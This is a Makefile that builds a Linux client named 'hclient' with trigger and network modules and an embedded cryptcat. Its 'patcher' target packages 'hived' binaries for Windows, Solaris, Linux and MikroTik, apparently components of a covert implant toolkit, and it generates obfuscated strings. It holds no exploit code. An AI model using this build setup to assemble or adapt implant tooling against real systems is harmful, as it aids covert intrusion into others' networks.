
CC = gcc
BINARY = hclient-linux

POLARSSL = ssl/polarssl
INCLUDES = -I$(POLARSSL)/include -I../libs -I. -Icryptcat
LIBPOLARSSL = $(POLARSSL)/library/libpolarssl.a

LDFLAGS = -lpthread

#CFLAGS += -Wall -Os -D_FILE_OFFSET_BITS=64 -m32
CFLAGS += -Wall -Os -m32
CFLAGS += $(INCLUDES) $(LDFLAGS) 

DFLAGS = $(CFLAGS) -DDEBUG -D_DEBUG
DFLAGS += $(INCLUDES) $(LDFLAGS)

CRYPTCAT = -DLINUX cryptcat/netcat.c
#CRYPTCAT = -DLINUX -lstdc++ cryptcat/farm9crypt.cc cryptcat/twofish.cc cryptcat/netcat.c
LIBFILES = trigger_utils.c trigger_network.c trigger_protocols.c ssl/crypto.c
#LIBFILES += string_utils.o init_strings.o init_crypto_strings.o $(LIBPOLARSSL)

CFILES = main.c functions.c misc.c modes.c parser.c \
		trigger.c trigger_network.c \
		trigger_protocols.c b64.c trigger_utils.c threads.c \
		string_utils.o init_strings.o init_crypto_strings.o \
		ssl/crypto.c $(LIBPOLARSSL)  

UNPATCHED_SOLARIS_SPARC = hived-solaris-sparc-unpatched
UNPATCHED_SOLARIS_I386 = hived-solaris-i386-unpatched
UNPATCHED_WINDOWS_I386 = hived-windows-i386-unpatched.exe
UNPATCHED_LINUX_I386 = hived-linux-i386-unpatched
UNPATCHED_MIKROTIK_I386 = hived-mikrotik-i386-unpatched
UNPATCHED_MIKROTIK_MIPSBE = hived-mikrotik-mipsbe-unpatched
UNPATCHED_MIKROTIK_MIPSLE = hived-mikrotik-mipsle-unpatched
UNPATCHED_MIKROTIK_PPC = hived-mikrotik-ppc-unpatched

UNPATCHED_BINS = $(UNPATCHED_SOLARIS_SPARC) $(UNPATCHED_LINUX_I386) $(UNPATCHED_WINDOWS_I386)
UNPATCHED_BINS += $(UNPATCHED_SOLARIS_I386) $(UNPATCHED_MIKROTIK_I386) $(UNPATCHED_MIKROTIK_MIPSBE)
UNPATCHED_BINS += $(UNPATCHED_MIKROTIK_PPC) $(UNPATCHED_MIKROTIK_MIPSLE)

.PHONY: all
all: $(LIBPOLARSSL) hclient debug patcher

$(LIBPOLARSSL):
	cd $(POLARSSL)/library && $(MAKE) -f Makefile.linux-x86
#	cd $(POLARSSL)/library && $(MAKE) -f Makefile.linux-x86_64

.PHONY: release
release: hclient

.PHONY: hclient
hclient: $(LIBPOLARSSL) strings
	${CC} ${CFLAGS} -o ${BINARY} ${CFILES} ${LDFLAGS} 
	strip ${BINARY}
	md5sum ${BINARY} > ${BINARY}.md5

.PHONY: debug
debug: $(LIBPOLARSSL) strings 
	${CC} ${DFLAGS} -o ${BINARY}-dbg ${CFILES} ${LDFLAGS} 
	md5sum ${BINARY}-dbg > ${BINARY}-dbg.md5

#library: $(LIBPOLARSSL) strings
library: strings
	gcc $(CFLAGS) -c $(LIBFILES)
	ar rv libhclient.a *.o
	ranlib libhclient.a

libcryptcat: cryptcat/farm9crypt.o cryptcat/twofish2.o
	gcc -c $(CRYPTCAT) 
	ar rv libcryptcat.a netcat.o farm9crypt.o twofish2.o
	ranlib libcryptcat.a

cryptcat/farm9crypt.o: cryptcat/farm9crypt.cc cryptcat/farm9crypt.h
	gcc -c cryptcat/farm9crypt.cc

cryptcat/twofish2.o: cryptcat/twofish2.cc cryptcat/twofish2.h
	gcc -c cryptcat/twofish2.cc

.PHONY: strings
strings: init_strings.o string_utils.o init_crypto_strings.o

init_crypto_strings.o: init_crypto_strings.c string_utils.o 
	gcc -c init_crypto_strings.c 

init_crypto_strings.c: crypto_strings.txt string_utils.o
	python mod_gen_cryptostring_header.py crypto_strings.txt CRYPTO_STRINGS

init_strings.o: init_strings.c string_utils.o
	${CC} -c init_strings.c

init_strings.c: client_strings.txt string_utils.h
	python mod_gen_string_header.py client_strings.txt CLIENT_STRINGS

string_utils.o: string_utils.c string_utils.h
	${CC} -c string_utils.c string_utils.h

.PHONY: patcher
patcher: $(UNPATCHED_BINS)
	@echo
	@echo "  Latest, unpatched builds of binaries must be"
	@echo "  present with the following naming conventions:"
	@echo "  . hived-windows-i386-unpatched.exe"
	@echo "  . hived-solaris-sparc-unpatched"
	@echo "  . hived-solaris-i386-unpatched"
	@echo "  . hived-linux-i386-unpatched"
	@echo "  . hived-mikrotik-i386-unpatched"
	@echo "  . hived-mikrotik-mipsbe-unpatched"
	@echo "  . hived-mikrotik-mipsle-unpatched"
	@echo "  . hived-mikrotik-ppc-unpatched"
	@echo
	xxd -i $(UNPATCHED_WINDOWS_I386) _unpatched_windows_i386.h
	xxd -i $(UNPATCHED_SOLARIS_SPARC) _unpatched_solaris_sparc.h
	xxd -i $(UNPATCHED_SOLARIS_I386) _unpatched_solaris_i386.h
	xxd -i $(UNPATCHED_LINUX_I386) _unpatched_linux_i386.h
	xxd -i $(UNPATCHED_MIKROTIK_I386) _unpatched_mikrotik_i386.h
	xxd -i $(UNPATCHED_MIKROTIK_MIPSBE) _unpatched_mikrotik_mipsbe.h
	xxd -i $(UNPATCHED_MIKROTIK_MIPSLE) _unpatched_mikrotik_mipsle.h
	xxd -i $(UNPATCHED_MIKROTIK_PPC) _unpatched_mikrotik_ppc.h
	gcc -m32 -Os -W -Wall -I. string_utils.c patcher.c -o hive-patcher
	strip hive-patcher
	md5sum hive-patcher > hive-patcher.md5

.PHONY: clean
clean:
	rm -f ${BINARY}* ${BINARY}-dbg* *.o *.a init_strings.c core cryptcat/*.o cryptcat/cryptcat
#	rm -f _unpatched_solaris_sparc.h _unpatched_windows_i386.h _unpatched_linux_i386.h
	rm -f _unpatched_*.h
	rm -f hive-patcher *PATCHED *PATCHED.exe
	rm -f *UNpatched*
	rm -f init_strings.*
	rm -f init_crypto_strings.*
	rm -f string_utils.o
	rm -f crypto_strings_main.h
	rm -f string_utils.h.*
	rm -f crypto_proj_strings.h
	rm -f mod_hexify.pyc
	make -C $(POLARSSL)/library clean

.PHONY: svnclean
svnclean:
	rm -f *.o init_strings.c core
	rm -f _unpatched_*.h
#	rm -f _unpatched_solaris_sparc.h _unpatched_windows_i386.h _unpatched_linux_i386.h
#	rm -f _unpatched_solaris_i386.h _unpatched_mikrotik_i386.h
	rm -f *PATCHED *PATCHED.exe
	rm -f *UNpatched*
	rm -f crypto_strings_main.h
	rm -f init_crypto_strings.c
	rm -f crypto_proj_strings.h
	rm -f string_utils.h.gch
	rm -f mod_hexify.pyc
